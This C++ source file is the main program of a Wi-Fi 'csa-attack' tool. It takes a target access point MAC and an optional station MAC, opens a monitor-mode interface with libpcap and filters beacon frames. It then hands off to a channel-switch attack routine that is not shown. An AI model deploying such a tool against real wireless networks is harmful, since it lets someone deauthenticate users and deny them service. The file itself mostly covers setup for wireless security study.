#include <iostream>
#include <string>
#include <pcap.h>
#include "MacAddr.h"
#include "CaptureCsaAttack.h"

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "syntax : csa-attack <interface> <ap mac> [<station mac>]\n"
                  << "sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
        return -1;
    }

    std::string interface = argv[1];
    std::string apStr     = argv[2];

    // parse AP mac
    uint8_t tmp[6];
    if (sscanf(apStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]) != 6) {
        std::cerr << "Invalid AP MAC\n";
        return -1;
    }
    MacAddr apMac(tmp);

    bool haveStation = false;
    MacAddr stMac;
    if (argc >= 4) {
        std::string stStr = argv[3];
        if (sscanf(stStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]) == 6) {
            stMac = MacAddr(tmp);
            haveStation = true;
        } else {
            std::cerr << "Invalid Station MAC\n";
            return -1;
        }
    }

    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        std::cerr << "pcap_open_live(" << interface << ") failed: " << errbuf << "\n";
        return -1;
    }
    if (pcap_datalink(handle) != DLT_IEEE802_11_RADIO) {
        std::cerr << "Not radiotap(802.11) interface.\n";
        pcap_close(handle);
        return -1;
    }

    // BPF filter: subtype beacon
    bpf_program fp;
    std::string filter_exp = "subtype beacon";
    if (pcap_compile(handle, &fp, filter_exp.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
        std::cerr << "pcap_compile error: " << pcap_geterr(handle) << "\n";
    } else {
        if (pcap_setfilter(handle, &fp) == -1) {
            std::cerr << "pcap_setfilter error: " << pcap_geterr(handle) << "\n";
        }
        pcap_freecode(&fp);
    }

    // info
    std::cout << "[*] Interface: " << interface << "\n";
    std::cout << "[*] AP MAC: " << apMac << "\n";
    if (haveStation)
        std::cout << "[*] Station MAC: " << stMac << "\n";
    else
        std::cout << "[*] Station MAC: <broadcast>\n";

    // start
    if (haveStation)
        startCaptureCsa(handle, apMac, &stMac);
    else
        startCaptureCsa(handle, apMac, nullptr);

    pcap_close(handle);
    return 0;
}
